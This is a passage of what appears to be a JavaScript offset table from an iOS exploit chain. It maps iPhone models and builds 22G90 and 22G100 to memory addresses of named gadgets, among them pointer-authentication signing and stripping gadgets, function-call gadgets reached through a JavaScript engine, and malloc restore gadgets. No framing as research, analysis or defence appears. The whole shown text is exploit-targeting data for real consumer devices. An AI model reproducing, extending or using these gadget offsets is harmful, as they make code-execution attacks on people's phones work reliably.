      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c925ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616f598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },

    "iPhone11,2_4_6_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abd402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c61dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d6698cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef4e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5e1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d5198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aaba02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c53dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d8398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee302ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610de98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7b8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26145098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec952ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
